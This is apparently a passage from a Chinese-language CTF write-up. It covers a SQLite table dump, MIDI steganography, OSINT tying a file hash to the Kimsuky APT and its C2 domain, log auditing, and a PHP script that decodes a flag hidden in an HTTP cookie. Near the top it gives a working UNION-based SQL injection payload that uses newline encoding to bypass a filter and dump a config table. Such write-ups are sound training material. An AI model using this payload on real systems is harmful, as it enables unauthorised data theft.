CREATE TABLE node_status (
    node_id INTEGER PRIMARY KEY,
    cpu_usage VARCHAR(10),
    ram_usage VARCHAR(10),
    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),
    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP
    ),
CREATE TABLE sys_config (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    config_key VARCHAR(50) UNIQUE,
    config_value TEXT
),
CREATE TABLE sqlite_sequence(name,seq)
```

看 sys_config 表，有三个字段：id ,config_key,config_value，这里我们去看后两个字段的值

![image-20251012151754654](imgs/image-20251012151754654.png)

最后的payload为

```
1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin(select%0a2)b%0ajoin(select%0a3)c%0ajoin(select%0agroup_concat(config_key)%0afrom%0asys_config)d%0ajoin(select%0agroup_concat(config_value)%0afrom%0asys_config)e
```



## Misc

### 美妙的音乐

用工具打开就能看见flag

![image-20251007210122751](imgs/image-20251007210122751.png)

flag{thi5_1S_m1Di_5tEG0}

### OSINT-威胁情报

给了一个hash值，直接微步

hash:2c796053053a571e9f913fd5bae3bb45e27a9f510eace944af4b331e802a4ba0

![image-20251007212011647](imgs/image-20251007212011647.png)

Kimsuky apt组织

![image-20251007212224529](imgs/image-20251007212224529.png)

年-月-日 2021-03-31

![image-20251007214255534](imgs/image-20251007214255534.png)

c2域名alps.travelmountain.ml

flag{kimsuky_alps.travelmountain.ml_2021-03-31}

### 日志分析-不敬者的闯入

审计日志，发现这条路径，访问看看

![image-20251007215244854](imgs/image-20251007215244854.png)

![image-20251007215442680](imgs/image-20251007215442680.png)

### 星期四的狂想

流量分析，先搜索flag，跟踪HTTP流，发现隐藏flag的地方，最后生成为Cookie，再往后面找找

![image-20251007222610959](imgs/image-20251007222610959.png)

找到了R2FYdDNaaHhtWlMwS21TR0szRVZxSUF4QVV5c0hLVzlWZXN0MllwVmdDOUJUTlBaVlM9PQ==

需要解密

![image-20251007222829871](imgs/image-20251007222829871.png)

写个解密脚本

```php
<?php

$encrypted = base64_decode("R2FYdDNaaHhtWlMwS21TR0szRVZxSUF4QVV5c0hLVzlWZXN0MllwVmdDOUJUTlBaVlM9PQ==");
$chunks = str_split($encrypted, 10);

$possible_flags = [''];

foreach ($chunks as $chunk) {
    $new_possibles = [];
    foreach ($possible_flags as $base) {
        // 可能性1: 这一块原为 ROT13
        $rot = str_rot13($chunk);
        $new_possibles[] = $base . $rot;

        // 可能性2: 这一块原为反转
        $rev = strrev($chunk);
        $new_possibles[] = $base . $rev;
    }
    $possible_flags = $new_possibles;
}

// 过滤函数：检查是否为有效的Base64编码结果
function isValidBase64Result($str) {
    // Base64编码只包含这些字符
    return preg_match('/^[A-Za-z0-9+\/]+={0,2}$/', $str);
}

// 过滤函数：检查Base64解码后是否为可打印文本
function isPrintableText($str) {
    // 检查是否包含不可打印字符（除了换行符和空格）
    if (preg_match('/[^\x20-\x7E\n\r\t]/', $str)) {
        return false;
    }

    // 检查是否有一定比例的可读字符（字母、数字、常见标点）
    $readableCount = 0;
    $total = strlen($str);
    if ($total == 0) return false;

    for ($i = 0; $i < $total; $i++) {
        $char = $str[$i];
        if (ctype_alnum($char) || strpos(' {}[]()-_=+.,;:!?/', $char) !== false) {
            $readableCount++;
        }
    }

    // 至少70%的字符应该是可读的
    return ($readableCount / $total) >= 0.7;
}

// 更严格的flag格式检查
function looksLikeFlag($str) {
    // 常见的flag格式
    $flagPatterns = [
        '/flag\{[^}]+\}/',
        '/FLAG\{[^}]+\}/',
        '/ctf\{[^}]+\}/',
        '/CTF\{[^}]+\}/',
        '/[a-zA-Z0-9_]{10,}/' // 或者长字符串
    ];

    foreach ($flagPatterns as $pattern) {
        if (preg_match($pattern, $str)) {
            return true;
        }
    }
    return false;
}

echo "正在分析 " . count($possible_flags) . " 种可能性...\n";

$validResults = [];

foreach ($possible_flags as $candidate) {
    // 首先检查候选字符串本身是否是有效的Base64
    if (!isValidBase64Result($candidate)) {
        continue;
    }

    $decoded = base64_decode($candidate, true);
    if ($decoded === false) {
        continue;
    }

    // 检查解码后是否为可打印文本
    if (!isPrintableText($decoded)) {
        continue;
    }

    // 检查是否包含flag特征
    if (looksLikeFlag($decoded)) {
        $validResults[] = [
            'base64' => $candidate,
            'decoded' => $decoded,
            'length' => strlen($decoded)
        ];
    }
}

// 按长度排序，flag通常不会太短
usort($validResults, function($a, $b) {
    return $b['length'] - $a['length'];
});

echo "\n有效结果:\n";
foreach ($validResults as $result) {
    echo "Base64: " . $result['base64'] . "\n";
    echo "解码: " . $result['decoded'] . "\n";
    echo "长度: " . $result['length'] . " 字符\n";
    echo "---\n";
}

// 如果没有找到flag格式，显示所有可打印结果
if (empty($validResults)) {
    echo "\n未找到标准flag格式，显示所有可打印结果:\n";
    $allPrintable = [];

    foreach ($possible_flags as $candidate) {
        if (!isValidBase64Result($candidate)) continue;

        $decoded = base64_decode($candidate, true);
        if ($decoded === false) continue;

        if (isPrintableText($decoded)) {
            $allPrintable[] = [
                'base64' => $candidate,
                'decoded' => $decoded
            ];
        }
    }

    foreach ($allPrintable as $result) {
        echo "Base64: " . $result['base64'] . "\n";
        echo "解码: " . $result['decoded'] . "\n";
        echo "---\n";
    }
}

?>
```

![image-20251007224607689](imgs/image-20251007224607689.png)